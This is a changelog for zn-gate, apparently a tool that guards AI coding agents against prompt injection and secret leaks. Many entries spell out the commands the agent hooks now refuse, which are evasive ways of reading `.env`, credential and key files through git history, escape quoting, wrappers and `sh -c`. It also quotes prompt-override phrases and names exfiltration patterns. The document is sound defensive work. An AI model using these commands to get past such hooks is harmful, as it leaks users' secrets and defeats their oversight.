- The unlocked vault now checks the whole audit log (every record's signature, the chain and the last record it remembers) before it shows the log (`zn vault log`), exports it (`zn vault log export --otlp`) or uploads it (`zn team sync`), and before it adds to it. Until now only the last record was compared, so a record changed in the middle of the log was not noticed until the next unlock or an explicit `zn vault verify`. If the check fails, the log is not shown, exported or uploaded, and the vault stores the same warning as before, which `zn vault verify` keeps reporting after lock and unlock until you accept the log with `zn vault verify --acknowledge` in your own terminal. Limits: with the vault locked, `zn vault log` and `zn vault log export --otlp` cannot check the chain; they say so and the result is not a verified copy. `zn team status` still counts the pending records without checking the chain.
- Masking now runs inside the vault daemon. The scrubber asks it where the vault's values occur in a text and gets positions and secret names back; no call lists the values any more (the `exactValues` request is gone). A program that can talk to the daemon can still get a stored secret by name by naming a context that fits it (a restore into a git-ignored file for an `env` or `file` mode secret, or an allowed host for a `proxy` mode secret and the HTTP tool), and can test guesses through the masking call without limit; see the threat model.
- Every request for a value now names a destination (the hooks) or a purpose (`zn run`, `secrets_http_request`, `secrets_render_file`), and the daemon checks it against what it holds: the restoration table, the secret's mode, the commands, executables, hosts and places you allowed, and the organization policy. A request with no context, or one the daemon does not know, is refused and written to the audit log. The names are declared by the caller, so the checks and the record are new but the daemon still does not prove which program is asking.
- A restore into a git-ignored file writes only `env` and `file` mode secrets, never `proxy` ones. The backup that `zn env shadow` keeps is never given out by any destination or purpose: `zn env unshadow` waits for your confirmation on the vault's own prompt before the plain text leaves the vault. The daemon never hands a value out for the assistant's own text.
- If the vault stops answering while a text is being checked, the output is held back (the post-hook withholds it, the streaming scrubber writes a notice) instead of being passed as if it held no vault values.
- `zn secret adopt`, `zn secret import` and `zn env shadow` no longer read a value back, and value comparisons are recorded and limited.
- On Linux and macOS the daemon refuses to start unless its socket, session key and folder belong to your user and are closed to others. A vault started by an older zn-gate counts as outdated: `zn unlock` restarts it.
- The vault no longer accepts a new secret value under 8 characters, from `zn secret set`, `zn env shadow --keys` or any other way to store one: such a value cannot be told apart from ordinary text, so it could reach the model unseen. A short value stored by an older version keeps working: it is matched exactly (the whole text, never a part of a word) and a short tool output is still checked for it.
- `zn vault reset` keeps an encrypted backup and says where it is. The new `zn vault purge` is the separate way to delete a vault for good: it lists every file it will delete (the vault, project token maps, the audit log, every backup and the session key), asks you to confirm (`--yes` for scripts, never for an AI agent), deletes them and checks that none is left. - `zn team join` no longer sends the join token to `api.usezn.com` before you agree. The vault now asks first whether it may look up which organization the token is for, and only then shows the organization and asks to confirm the join. - The vault audit check (`zn vault verify`) now compares the last record the vault remembers by sequence number and MAC, not only by record count. Audit records are now flushed to disk when written. Limits: restoring an older `secrets.age`, with or without its older `audit.jsonl`, is not detected, and if the vault process is killed, records written since its last save (up to a minute) can be cut without notice.

- [GHSA-qwh8-5vj5-mvj8](https://github.com/usezn/zn/security/advisories/GHSA-qwh8-5vj5-mvj8): some provider token formats were not redacted by the library API, the MCP tool checks, the text sent to the cloud analysis and the local evidence preview. If the key cannot be read, prompts are checked locally and zn-gate says so once.
- The agent hooks: a command that reads the system keychain for zn's entries is checked in linear time (it took several seconds on a 100 KB command before), and `zn-gate connect` and `zn-gate disconnect` now count as commands only the user may run. `POLICY_RULES_VERSION` is `2026-10-18.31`.
- The saved cloud key is also held back while `NODE_OPTIONS` has `--tls-keylog`, `--inspect` (with its variants) or `--openssl-shared-config`, and the zn vault's request tool for agents (`secrets_http_request`) never fills in that key, so an agent cannot use it to revoke the key or spend its quota. The hooks also refuse a command that loads zn-gate's own client modules (found by their `zn-gate/lib/client` path) to ask for the key, as a barrier only.

- The agent hooks: a glob that can match a private key file (`cat certs/*.key`, `certs/*`) is checked against the files it matches on the disk, a key file read after `cd` is looked up in the folder the `cd` leads to (an unknown `cd` refuses it, like a `.env`), and reading a key file from the git repository or its history (`git show HEAD:certs/server.pem`, `git log -p -- server.key`) is refused. Certificates and `.pub` files stay readable from the disk.
- The agent hooks: git is recognised behind `sudo`, `env`, `command`, `nohup` and `xargs`, a `<rev>:<path>` word naming a `.env`, credential or key file is refused anywhere in a command that runs git (`echo HEAD:.env | xargs git show`), and git pathspec magic (`':(top).env'`, `':/.env'`) is read as the path.
- The agent hooks: code run from a string is also checked behind more wrappers (`chrt`, `taskset`, `strace`, `ltrace`, `runuser`, `chroot`, `unbuffer`, `nsenter`, `script -c`) and when a wrapper is not one zn knows, after shell options such as `bash -O extglob -c` and `--rcfile`, for `fish -C`, for PowerShell parameters given as any prefix or with `/` (`-en`, `/Command`), for `powershell "<code>"`, and for `iex` and `Invoke-Expression` (also when a string is piped into them), and `sg -c`.
- `zn-gate reach`: a server, file or path name that contains a line break or a tab can no longer start a line of its own in the text report; such characters become a space. Zero-width and other invisible characters are removed from every name before secret values are hidden and again after, and the file that `--remember` keeps is ignored when it is larger than 1 MiB.
- The agent hooks: the code a shell or wrapper runs from a string (`sh -c`, `bash -lc`, `sudo sh -c`, `su -c`, `flock -c`, `env -S`, `eval`, `watch`, `pwsh -Command`, `cmd /c`, `Start-Process git -ArgumentList`; the `-c` of tools such as `psql` or `grep` is not code and is left alone) is now checked as a command of its own, so every rule applies inside it, including reading a `.env`, credential or key file from git history. Nesting deeper than three levels is refused.
- Hardened the audit log (`~/.zn/evidence.jsonl`), whose hash chain is what lets you notice if a record was changed or removed. Several processes writing at once (two agents in one project, or the Node and Python versions together) could each add a record after the same previous one and split the chain, so `evidence --verify` reported a break that was not tampering and a real break could be hidden among them. Every write now takes a short lock first (an `evidence.jsonl.lock` file next to the log, shared by both versions), so the records stay in one line. If the lock stays busy for 2 seconds the write is skipped with a warning instead of risking a split, and a lock left behind by a crashed process is cleared after 10 seconds. A writer that was paused for a long time and lost its lock checks this before writing, so it cannot add a record based on out-of-date information.
- A `record_hash` that is not 64 lowercase hex characters is now treated as a damaged last record, like other damage, instead of being trusted as the start of the next link.
- The key-protection rule now also recognises the module names when they are written with escape sequences (JavaScript or shell, such as `\x2f`) or split by quotes.
- The agent hooks: a `.env` file reached through a Windows root, a network share or an extended-length path (`type %CD%\.env`, `more \\server\share\.env`, `gc \\?\C:\path\.env`) is refused, because zn cannot read a path like that to check whether the file holds values, and a `.env` name is now recognised after a backslash separator on every platform.
- More automated tests read a `.env` with the commands of cmd.exe and Windows PowerShell (`type`, `more`, `copy`, `findstr`, `Get-Content`, `gc`, `-Path`, `-LiteralPath`, `Select-String`) over relative, absolute, drive-relative, profile-variable and UNC paths: a `.env` with values is refused and an ordinary file is allowed in every form, on Linux and in the Windows checks job. No change beyond the refusal above.

### Security
- [GHSA-rccq-h3xc-j9qj](https://github.com/usezn/zn/security/advisories/GHSA-rccq-h3xc-j9qj): the agent hooks could let a protected file be read without being checked when the command reached it indirectly, or when the command was too long or slow to check. The bullets below are the fixes.
- `zn audit` hides a secret value given as the next item of a JSON array after a credential flag, as in the arguments of an MCP server: `"args": ["--api-key", "..."]`. Earlier versions could quote it in the evidence of a finding.
- `zn audit` no longer shows secret values in a format it does not know when they follow a credential flag (`--token`, `--api-key`, `--password`), an auth header (`Authorization: Bearer ...`, `x-api-key: ...`) or a name such as `API_TOKEN=`, in the command lines and hook commands it quotes. Earlier versions could quote such a value in a finding; rotate any that a finding showed. References such as `$TOKEN` or `${API_KEY}` are kept.
- Releases are built, attested and signed by a separate reusable workflow, `build-release.yml`, whose build and signing jobs the release workflow calls but cannot reach. That makes the build provenance of the npm and Python packages SLSA Build Level 3. To verify a release from 1.12.0 on, the signer workflow of the GitHub attestations and Sigstore signatures is `usezn/zn/.github/workflows/build-release.yml` (earlier releases: `release.yml`; npm provenance and PyPI attestations still name `release.yml`); see `docs/verify-release.md`. The agent plugin's checks pick the signer workflow from the release's own tag.
- Release tags are created and signed by a workflow, `tag-release.yml`, with gitsign (Sigstore keyless signing), so the signature names that workflow and no person's identity. It runs only from `main`, checks that the commit is the head of its release branch, that every version matches and that every check passed, and waits for approval before it signs. From 1.12.0 on, the release workflow refuses to publish a tag unless it carries a valid signature from `tag-release.yml`. How to check a tag: `docs/verify-release.md`.
- The agent hooks: a `.env` file with values is refused when a command reaches it after changing directory (`cd app && cat .env`, also when the current folder's `.env` is shadowed), through a path built while the command runs (`cat $DIR/.env`, `cat $(...)/.env`), or from code given to an interpreter or shell (`python -c "open('app/.env')"`, `bash -c "cat app/.env"`). Earlier versions only checked the path as typed, from the current folder. `POLICY_RULES_VERSION` is `2026-10-17.5`.
- The agent hooks: a `.env` file with values is refused when a shell command names it with bash `$'...'` quoting (`cat $'\x2eenv'`, also with a NUL that ends the string) or `$"..."`, through an input redirection with a descriptor number or in read-write mode (`cat 0<.env`, `cat <>.env`, `exec {fd}<.env`), or as the value of a `name=value` argument (`dd if=.env`). `POLICY_RULES_VERSION` is `2026-10-17.6`.
- The agent hooks: reading a `.env` or credential file from the git repository (`git show HEAD:.env`, `git cat-file -p :app/.env`) or its history (`git log -p -- .env`, `git checkout HEAD -- .env`, `git archive HEAD .env`) is refused, like reading it from disk, also when the file is no longer on disk. Clean-up steps still work: `git rm --cached .env`, `git restore --staged .env`, `git checkout -- .env`, `git status`, `git check-ignore .env` and `git log --oneline -- .env`. `POLICY_RULES_VERSION` is `2026-10-17.7`.
- The agent hooks: a shell command that names a `.env` file in a subfolder through a wildcard (`cat app*/.env`, `cat src/*/.env`, `cat {a,b}/.env`) is refused, like the plain path. Earlier versions let it run, because the file was looked for under the pattern itself and not found. `POLICY_RULES_VERSION` is `2026-10-17.3`.
- Rust gateway in `src/` (experimental, not distributed: not part of the npm or PyPI packages or the plugin): post-quantum policy signatures are ML-DSA-65 (FIPS 204), verified with the maintained RustCrypto `ml-dsa` crate, instead of Dilithium3 from the unmaintained PQClean bindings; three `cargo audit` exceptions are gone. A policy signed with a Dilithium3 key must be signed again with an ML-DSA-65 key. See `docs/rust-core.md`.
- The agent hooks: a private key kept outside `~/.ssh`, for example in a project, is refused like one in `~/.ssh`: `id_rsa`, `id_ed25519` and the other SSH key names, key stores (`.p12`, `.pfx`, `.jks`, `.ppk`), and `.pem`, `.key` or `.p8` files that hold a private key. Certificates and public keys stay readable. `POLICY_RULES_VERSION` is `2026-10-17.8`.
- The agent hooks look inside a `.env` or key file without blocking: a FIFO or other special file with such a name is refused without being read, and a name repeated in a long command is checked once.
- The agent hooks check a shell command within a time and disk budget, well below the agent's hook timeout: a command with too many paths to check in time is refused, instead of running unchecked once the agent stops waiting.
- The agent hooks check every command in a long chain. Earlier versions checked only the first 1000 simple commands (lines count too) and let the rest run unchecked.

## [1.6.0-beta.1] - 2026-10-14

Pre-release for testing. Install it with `npm install -g zn-gate@beta` or `pip install --pre zn-gate`. The agent plugin in `plugins/zn-gate` is not published with this beta; it ships with 1.6.0.

### Added
- Cloud checks of long texts (`analyze_prompt`, `zn-gate analyze`, Python `analyze()`, only with `ZN_CLOUD=1` and a key): a text over 1,000 characters asks the classifier for overlapping 512-token windows (stride 256, up to 20) instead of reading only the first 512 tokens; the verdict comes from the window with the highest score, and a text that fits in one window gets the same result as before. It covers Claude Code, Codex, Cursor, OpenCode, Amazon Q, Copilot and Gemini CLI. Output as text, JSON or SARIF 2.1.0 (GitHub code scanning); `--fail-on` sets the exit code. Rules `ZNA001`-`ZNA020` and the public vulnerabilities behind them: [docs/audit.md](docs/audit.md). The secret-use log that `zn audit` showed in 1.5 is `zn vault log` (alias `zn secret log`); `zn audit log` and `zn audit --since` exit with code 2 and point there.

  Cursor and OpenCode.

### Security
- Prompt hooks (all agents) block a prompt that assigns a value to a credential name anywhere in the text, also in the middle of a sentence and even when the value does not look random: `my key is STRIPE_KEY=...`, `DB_PASSWORD=...`, `"api_key": "..."`, `apiKey=...`, `?api_key=...` in a URL. The value must be at least 8 characters. Left alone: placeholders and demo values (`changeme123`, `your_api_key_here`, `<key>`, `xxxx`, `dummy…`, `mock…`), references (`${API_KEY}`, `$API_KEY`, `process.env.X`, `secrets.X`, `__ZN_…__` markers), code (calls, indexes, type annotations, identifier chains such as `self.api_key` or `new_password`) and lower-case prose such as `token: required`. The block message still suggests `zn secret set NAME`. Tool calls and tool output do not use this rule. The Python package has no prompt hook, so it is not affected.
- `zn hooks install claude-code` and the Claude Code plugin set `onFailure: "block"` on the prompt hook, so a prompt is blocked, not sent unchecked, if the hook cannot start or times out (Claude Code 2.1.295 and later; earlier versions ignore the field). Tool hooks keep the documented behaviour. [docs/compat.md](docs/compat.md) now lists what each agent does when the zn hook cannot run.
- `zn-gate scan` (Node and Python) reports a private key that has a BEGIN marker but no END marker (cut short when pasted or truncated), and never prints its lines: the lines after the marker that look like base64 or PEM headers count as key material, up to the first empty or other line (the empty line after the `Proc-Type` / `DEK-Info` headers of an encrypted key is kept). Both scanners now also scan private key files without an extension (`id_rsa`, `id_ed25519`…), and skip `.key` files with a NUL byte in the first 8 KiB (a Keynote document, not a key). The Python scanner matches extensions regardless of case (`SERVER.PEM`) and, like the Node one, skips files of 2 MiB or more.
- `zn-gate scan` (Node and Python) never prints a line that is inside a private key spanning several lines, even when another rule fires on that line (for example injection text next to key material); such lines show `[REDACTED_PRIVATE_KEY]`. `.pem` and `.key` files are now scanned. The printed BEGIN marker is cut to 100 characters.
- Node `zn-gate scan` now reports exposed credentials, as the Python scanner does: before, it reported only lines the injection rules blocked, so a file with an API key or a private key passed. Each secret is reported once per rule and line with the line redacted, and a private key whose BEGIN and END markers are on different lines is reported at its BEGIN line, showing only that marker. Files that contain credentials now make the scan exit with code 1.
- Python `zn-gate scan` reports a private key whose `-----BEGIN ... PRIVATE KEY-----` and `-----END ... PRIVATE KEY-----` lines are on different lines, as PEM files always have them. The scan read one line at a time, so these keys were never reported. Only the `-----BEGIN ... PRIVATE KEY-----` marker is shown, never the key.
- Windows: looking up a program on PATH (for `zn run` and to find agent CLIs) uses a name as written only when it already has a PATHEXT extension, as Windows does: an npm install puts an extensionless shell script `claude` beside `claude.cmd`, and zn picked the script, which Windows cannot run. When `zn hooks install claude-code` cannot register the `secrets` MCP server itself, it now prints `claude mcp add --scope user secrets -- "<node>" "<cli.js>" ...`, which works in cmd.exe, PowerShell and POSIX shells.
- Secret redaction covers credentials assigned to environment-style names with a prefix: `OPENAI_API_KEY=…`, `STRIPE_SECRET_KEY: …`, `"DB_PASSWORD": "…"`, `ENV HF_TOKEN …` in a Dockerfile and `$OPENAI_API_KEY = '…';` in PHP or PowerShell (new rule `secret:prefixed_credential`: upper-case names ending in `API_KEY`, `APIKEY`, `ACCESS_KEY`, `SECRET_ACCESS_KEY`, `SECRET_KEY`, `PRIVATE_KEY`, `CREDENTIALS`, `SECRET`, `TOKEN`, `PASSWORD`, `PASSWD`, `PASS` or `PWD`). The names already covered by `secret:env_credential` (`API_KEY`, `SECRET_KEY`, `AUTH_TOKEN`…) are now also found as quoted JSON keys (`"api_key": "…"`). The value of these assignments is checked before it is redacted. Left alone: references (`${VAR}`, `$VAR`, `$env:VAR`, `%VAR%`, paths, file names such as `service-account.json`, host names, URLs without a password, `op://` and other `scheme://` references, ARNs, `vault:`, `secretref:`, Azure Key Vault and Google Secret Manager references), code (`process.env.X`, `os.environ[...]`, `settings.X`, `std::env::var(...)`, `$this->config->get(...)`, `z.string()`, other calls, indexes and identifier chains, constant names), placeholders that are the whole value (`<your-key>`, `{{ … }}`, `****`), placeholder words (`your-key-here`, `changeme`, `fake-…`, `mock-…`, `__ZN_…__` vault markers) and short lower-case slugs that name an object (`regcred-ghcr`, `ingress-nginx-tls` under `*_SECRET`). A value that looks machine-generated is redacted even when it contains a placeholder mark (`<…>`, `${`, `{{`, `***`, `...`, or starts with `<`, `{` or `[`, as passwords from a password manager can) or has the shape of code or a path, such as a Mapbox `sk.eyJ…` or SendGrid `SG.….…` key or a base64 key that starts with `/`; a URL with a password in it is redacted too. `$NAME = …` counts as an assignment; `$NAME:` and `${NAME}` are references. The default in `${NAME:-value}` is redacted only when it looks machine-generated (new rule `secret:credential_default`). The checks read up to 32 K characters of values per call; past that, matches are redacted without them, which bounds the time spent on crafted input (more is redacted, never less). Node.js now counts the 12-character minimum of these rules in characters, as Python does, so an emoji counts once. Because more credential lines are found, the Python `zn-gate scan`, which reports secrets, can exit with code 1 on files it used to pass. `RULES_VERSION` is now `2026-10-12.6`.

### Known limitations
- The agent plugin (`plugins/zn-gate`) checks every file of the installed zn-gate on each hook call, on top of the cost of the hook itself: a median of 15 to 27 ms per call on Linux and macOS and 51 to 90 ms on Windows in CI (`plugins/tools/bench-launch.js`). It needs Node.js 20.12 or later and refuses to run when `vm.constants.USE_MAIN_CONTEXT_DEFAULT_LOADER`, an experimental Node.js API, is missing.
- Credentials under environment-style names are not redacted when the name is lower case or camelCase (`db_password:`, `apiKey =`), when the value is shorter than 12 characters, or when the value is lower-case words joined by `_` (read as an identifier). Lower-case words joined by `-` or `.` are redacted as a passphrase, except when they read as a name: two words (`regcred-ghcr`); three words with a short word or a number (`ingress-nginx-tls`); three words under a `*_SECRET` or `*_CREDENTIALS` name (`JWT_SECRET=orbit-maple-harbor` is not redacted); a host name or a file name (`smtp.example.com`, `service-account.json`); or words that give an instruction (`ask-the-ops-team`, `get-from-vault`).

## [1.5.0] - 2026-10-12

Secrets scrubber and broker: secret values stay out of what your coding agent
sends to its model. Walkthrough: [docs/secrets.md](docs/secrets.md).
Limits: [docs/threat-model.md](docs/threat-model.md). Per-agent support:
[docs/compat.md](docs/compat.md).

### Added
- **Scrubber engine** (`lib/scrub/`), 100 % local, in three layers:
  - known values from the vault and from local `.env` files;
  - about 30 secret formats (cloud keys, tokens, private keys, connection-string passwords);
  - PII with checksum validation (cards, IBAN, DNI/NIE, SSN; e-mail, phone, IPv4).
  Values become deterministic tokens such as `__ZN_AWS_KEY_1__`. Gated in CI by the leak bench: 0 leaks, at most 0.1 % of benign files changed.
- **Encrypted local vault** (`zn unlock` / `zn lock`, `lib/vault/`):
  - [age](https://age-encryption.org) encryption, with the identity in the OS keychain (macOS, Windows, Secret Service) or behind a passphrase;
  - a short-lived daemon on a private socket or pipe, with mutual authentication;
  - an HMAC-chained audit log that holds no values (`zn vault log`, `zn vault verify`).
- **Secrets broker**:
  - `zn secret set|list|rm|allow|approve|import|adopt` and `zn env shadow|unshadow` (move `.env` values into the vault and leave markers);
  - `zn run -- <command>` fills values only into allowed commands and masks their output;
  - the `secrets` MCP server (`secrets_http_request`, `secrets_render_file`, `secrets_request`), which has no tool that returns a value.
- **Agent hooks**: `zn hooks install claude-code|codex|cursor|opencode`.
  - They block reads of `.env` files with values, credential files and `~/.zn`.
  - They scrub tool output and block pasted secrets.
  - They route commands that use stored secrets through `zn run`.
  - What each agent allows differs: see `docs/compat.md`.
  - Claude Code coverage includes Bash, PowerShell, Monitor (through a streaming filter), Read, Grep, LSP, WebFetch, MCP tools and MCP resources.
- **Out-of-band confirmation**: the first use of a secret by a command, and any change that widens a secret's policy, are confirmed in the vault's own terminal (`zn unlock --foreground`) or a system dialog. They are never confirmed in the agent's terminal.
- End-to-end runs with Claude Code, Codex and OpenCode against a scripted provider, with 0 values sent (`bench/e2e/`). Hook latency figures are in `bench/HOOK_LATENCY.md`.
- MCP Registry metadata: `package.json` declares `mcpName` (`io.github.usezn/zn-gate`) and `packages/zn-gate/server.json` describes the `zn-gate mcp` server (stdio) and its optional environment variables.

### Security
- Scrubber: secrets without a known prefix are now caught under a sensitive key name in YAML without quotes, docker-compose `environment:` (map and `- KEY=value` list), dotenv and Dockerfile `ENV` / `ARG` lines, and `docker run -e`, including hex values of 32 digits or more. Commit hashes, colors, UUIDs and digests in other fields, placeholders and references (`${VAR}`, `$VAR`, `${{ … }}`) are left alone.
- `secrets_http_request` puts a value only in request headers unless the secret allows the URL or the body (`zn secret allow NAME --in query|body`).
- First-use approvals are bound to the executable's real path and file identity. A replaced or retargeted binary loses its approval. Binaries inside the project never receive values.
- The vault file carries an integrity tag. A forged, corrupted or deleted vault fails closed.
- `zn run` resolves the command once, opens that file, checks the open file against the approval, checks it again right before start and starts that exact path; on Linux a native program is started through the opened file itself. The approval dialog and `zn secret allow` warn when the program lives in a location your user can write. If an approved program changed, the dialog says so, with the old and new size and change time.
- Interpreters are recognised with version suffixes (`python3.12`, `node22`, `pwsh-preview`) for the "runs any code" warning.
- Claude Code Monitor commands always run as a single `bash -c` argument piped through the streaming scrubber, with `pipefail`. The streaming scrubber holds back the end of a partial line, so a value written in two bursts is never split.
- Paths in hook commands and in the commands the hooks rewrite (the `zn run` prefix of Bash commands, the Monitor scrubber pipe) are single-quoted for sh, and PowerShell-quoted where PowerShell runs them (the PowerShell tool rewrite, Codex `commandWindows`), so an install path containing `$(…)` or backticks can no longer run commands. A quote in a path is written as `'"'"'`, which also keeps it inside a string when PowerShell reads an sh command (Claude Code hooks without Git Bash, the OpenCode bash tool on Windows). On Windows, Codex `commandWindows` and Cursor hooks call `powershell.exe` in a form that cmd.exe, PowerShell and Git Bash leave unchanged (`-EncodedCommand` when a path holds `%`, `!`, `$`, a backtick, a quote or a control character). Hooks installed by earlier versions are still recognised by `zn hooks install` and `zn hooks uninstall`.
- A missing scrubber engine fails closed by default, with instructions to reinstall; `{"hooks": {"whenUnavailable": "allow"}}` in `~/.zn/config.json` lets events pass while it is missing.
- `secrets_render_file` writes a new file inside the project directly; overwriting a file or writing outside the project (also through a symlinked directory) needs your confirmation in the vault prompt.
- Confirmation dialogs show warnings first; paths and other fields sent by a client are shown on one line, with control and invisible characters escaped.
- `age-encryption` and its `@noble` / `@scure` dependencies are bundled in the npm package at the exact versions of the lockfile (`bundleDependencies`), so installing zn-gate does not resolve them from the registry.
- Rules engine (Node.js and Python): removed super-linear regular expressions and normalization steps that let a crafted input of a few KB to a few hundred KB stall the gate for seconds to minutes (newline rejoining, fake system tags, hidden HTML elements, markdown image exfiltration, JWT redaction, Russian and Chinese rules). Hidden elements, markdown images and the Russian and Chinese rules are now matched by a single linear scan plus checks in code, which also removes the length caps on tag attributes, image alt text and URLs. For hidden elements and markdown images, the exported `.pattern` is the linear scanner the rule uses, not the full rule; the Russian and Chinese rules keep a bounded reference `.pattern` and match with a linear scan in code. Inputs over 8 KB no longer enter the result cache. The Python rules use the same patterns, normalization and size limits as the Node.js rules, and a test fails if the two diverge.
- Inputs over 256 KB: `evaluate()` / `analyze` analyse the first 192 KB and the last 64 KB and mark the result `truncated: true`. Tool results are scanned in full in overlapping 256 KB windows up to 4 MB: `sanitizeToolResult` and `checkToolResult` (and through them the MCP tool `check_tool_result` and `shield`) in Node.js, `sanitize_tool_result` and `check_tool_result` in Python. `sanitizeToolResult`, `checkToolResult` and `sanitize_tool_result` return a top-level `truncated` field (Python `check_tool_result` sets `Assessment.truncated`); set `blockTruncated: true` (Node.js), `block_truncated=True` (Python `sanitize_tool_result`, `check_tool_result` and `@guard(check_result=True)`) or `ZN_BLOCK_TRUNCATED=1` (both, including `@guard(check_result=True)` and the LangChain integration) to block output that could not be scanned in full.
- `ignore` / `disregard` rules now require an object: instructions, prompts, rules, guidelines, directives, guardrails, context and similar, with a qualifier (previous, prior, above, earlier, original, system, safety...) or a quantifier (all, any, every, your, these, those...), or a reference back to earlier text ("ignore the above.", "everything above"). Sentences like "Please ignore the noise in the logs" or "ignore the previous build output" are no longer blocked. A new rule covers the Portuguese and Spanish imperative ("ignore todas as instruções", "ignora todas las reglas"). Node.js and Python.
- The evidence dashboard (`zn-gate evidence --ui`) listens on 127.0.0.1 only, answers only requests whose `Host` header is `127.0.0.1:<port>` or `localhost:<port>` (other hosts get 403, which blocks DNS rebinding), and escapes every ledger field shown in the dashboard.

- Secret detection in Python no longer misses a key written right next to a non-ASCII letter (for example `cléAKIA…`): secret patterns use explicit ASCII token boundaries, as the Node.js rules already did. `RULES_VERSION` is now `2026-10-12.1`.
- The OpenAI key pattern covers OpenRouter (`sk-or-v1-`), Langfuse (`sk-lf-`) and admin keys, and no longer matches hyphenated text such as URL slugs (a key without a known prefix must be at least 28 letters and digits). Private-key redaction no longer slows down on text with many `BEGIN ... PRIVATE KEY` headers and no end marker. Node.js and Python now redact `aws_secret` values the same way, keeping the original quotes, and Python matches credential names with ASCII letters only, as Node.js does (the Kelvin sign or a long s no longer count as `K` or `s`). Python, like Node.js, also finds `aws_secret` values under names with a prefix such as `MY_AWS_SECRET=`. A key without a known prefix is still found when it is followed by `_` (`sk-…_backup`). Python matches connection-string schemes (`postgres://`, `mysql://`, `mongodb+srv://`, `redis://`, `amqp://`) with ASCII letters only, like Node.js, so `poſtgres://` is no longer treated as `postgres://`; `RULES_VERSION` is now `2026-10-12.4`.
- The OpenAI key pattern also finds Helicone keys (`sk-helicone-…` with its `eu`, `cp`, `gov` and `rl` variants, also when followed by `-`, `_` or an uppercase letter), the Helicone forms without the word `helicone` (`sk-cp-…`, `sk-xxxxxxx-xxxxxxx-xxxxxxx-xxxxxxx`; these must contain a digit, and are left alone when followed by `-` and a letter or digit, which reads as a longer slug), Alibaba Cloud Model Studio Token Plan and Coding Plan keys (`sk-sp-` followed by 28 or more letters and digits; the body format is not documented, so this length is an assumption), and OpenAI keys with any other `sk-<name>-` prefix that carry OpenAI's `T3BlbkFJ` marker, such as older service-account keys. Hyphenated text such as URL slugs is still not matched, and keys matched before keep the same redacted span. `RULES_VERSION` is now `2026-10-12.5`.
- Releases are built once by a tag-triggered workflow and published to npm and PyPI with trusted publishing (OpenID Connect, no stored tokens), after a manual approval. Each release ships `SHA256SUMS`, Sigstore bundles and GitHub build provenance attestations; npm and PyPI carry provenance too. Prereleases go to the npm dist-tags `beta`, `next` (release candidates) or `alpha` and never move `latest`. 1.5.0-beta.1 and earlier versions are not signed. How to check them: [docs/verify-release.md](docs/verify-release.md).

### Known limitations
- Detection of credentials under prefixed variable names (e.g. OPENAI_API_KEY=) is partial in this release.
- Cursor cannot rewrite the output of shell commands or file reads. Codex can only replace output through "block", and keeps the original in its own session log.
- Each hook is a short Node process: measured about 78 ms p50 per tool call on a Windows desktop and 124 ms on a small server (`bench/HOOK_LATENCY.md`). The floor is Node's start-up; scanning inside the vault daemon would remove most of it and is planned for a later release, with its own review.
- With the vault unlocked, any process of your OS user can ask the vault daemon for a stored secret by name. Approvals, fingerprints and `allowIn` protect the `zn run` and MCP paths, not that one (see `docs/threat-model.md`).
- Scripts (`#!`) approved for `zn run`, and every program on macOS and Windows, are started by path right after the final check: a process of your user that can write the program's directory could still swap it in that short window. Prefer approving native programs in directories your user cannot write.
- Not covered yet: Hermes, Gemini CLI, Copilot CLI and the Cursor CLI. An egress proxy for `zn run` is not included.
- Rules engine size limits: prompts over 256 KB are analysed as head + tail, so a payload in the middle is not seen (the result says `truncated: true`). Tool results over 4 MB are analysed in full up to 4 MB plus their last 256 KB, and are allowed with `truncated: true` unless blocking is enabled (see Security). Tool-result windows overlap by 4 KB, so a hidden HTML element whose payload starts more than 4 KB after the tag, across a window boundary, can be missed.

## [1.4.1] - 2026-10-11

### Security
- **1.4.0: with `ZN_API_KEY` set, tool results and tool-call arguments were sent to api.usezn.com for analysis without redaction. 1.4.1 removes that path entirely; cloud analysis is now opt-in (`ZN_CLOUD=1`), prompt-only and redacted.**
  - Affected: the Node package (`zn-gate` on npm) up to and including 1.4.0, when `ZN_API_KEY` was set and `ZN_LOCAL_ONLY` was not `true`. Inputs blocked by the local rules were never sent. Without `ZN_API_KEY` nothing was sent.
  - Paths that sent data in 1.4.0: the MCP tools `check_tool_result`, `check_tool_call` and `analyze_prompt`, the `zn-gate shield` proxy (tool arguments, tool/parameter descriptions and tool results), `zn-gate analyze` and `zn-gate test`.
  - Python (`zn-gate` on PyPI) up to 1.4.0: only `analyze()` and `zn-gate analyze` sent data, when `ZN_API_KEY` was set, without redaction. `guard`, `check_tool_*`, `sanitize_tool_result` and the integrations were always local.
  - Recommended action: upgrade to 1.4.1. If you used 1.4.0 with `ZN_API_KEY`, consider rotating any credential that could have appeared in tool output.

### Changed
- **Tool results, tool-call arguments and tool descriptions are evaluated only locally**, under every configuration (MCP server, `shield`, library API).
- **Cloud analysis is opt-in:** it requires both `ZN_API_KEY` and `ZN_CLOUD=1`, applies only to prompt analysis (`analyze_prompt`, `zn-gate analyze`, `analyze()`), and the text is passed through `redactSecrets` / `redact_secrets` before sending. `ZN_LOCAL_ONLY=true` still overrides everything.
- **Secret redaction now runs on the real code path:** `check_tool_result` always returns content passed through `sanitizeToolResult`; `check_tool_call` returns `sanitized_arguments`; `shield` forwards allowed tool output with secrets redacted (not in `--shadow` mode). In 1.4.0 these functions existed but no executable path called them.
- The local audit log stores a secret-redacted `payload_preview` (the SHA-256 is still computed over the original payload).
- `zn_status` and `zn-gate status` report what leaves the machine. Removed the "Set ZN_API_KEY for neural protection" tip.
- `zn-gate test` (self-test) never uses the network.

### Fixed
- Python CLI: `zn-gate test` printed `BLOCK` when the verdict was `allow` and only the secret detector had fired. It now prints the real verdict and the DLP alert on its own line. The exit code is unchanged: 1 whenever something was flagged (a block or a secret).
- `zn-gate init` config locations and formats, verified against the official docs:
  - **Codex CLI:** `~/.codex/config.toml` (or `$CODEX_HOME/config.toml`), `[mcp_servers.<name>]` TOML tables. 1.4.0 wrote to a non-existent `~/.codex/config.json`.
  - **OpenCode:** `~/.config/opencode/opencode.json` (`mcp` key, `command` array, `type: "local"`). 1.4.0 used `~/.local/share/opencode/mcp.json`.
  - **Claude Desktop on Linux:** `~/.config/Claude/` (1.4.0 used `~/config/Claude/`, missing the dot).
  - Files that cannot be rewritten safely (JSONC with comments, multi-line TOML arrays) are reported as "wrap manually" instead of being modified.

### Documentation
- Removed figures without a public method (fixed "< 0.1 ms" style latency claims, "99.4 % accuracy", the comparison table against other guardrails, "100 % defense rate"). Added a single latency table with hardware, date and `bench/bench_by_size.js` to reproduce it.
- "Cryptographic / tamper-evident ledger" reworded: it is a hash-chained local log that detects accidental edits, not tamper-proof against someone with write access.
